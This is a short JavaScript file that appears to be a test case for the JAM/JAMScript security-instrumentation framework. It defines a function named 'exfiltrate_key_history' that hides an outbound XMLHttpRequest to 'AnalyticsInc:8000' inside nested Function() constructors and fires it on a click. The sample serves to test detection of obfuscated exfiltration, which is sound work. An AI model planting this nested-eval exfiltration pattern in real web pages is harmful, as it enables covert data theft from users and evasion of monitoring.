
JAM.startProfile('load');
function exfiltrate_key_history(){var nest='var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest3", true);xmlhttp.send(null);\';return Function(exp);',nest=JAMScript.call(Function,null,[nest]),nest=JAMScript.call(nest,null,[]);JAMScript.call(nest,null,[])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
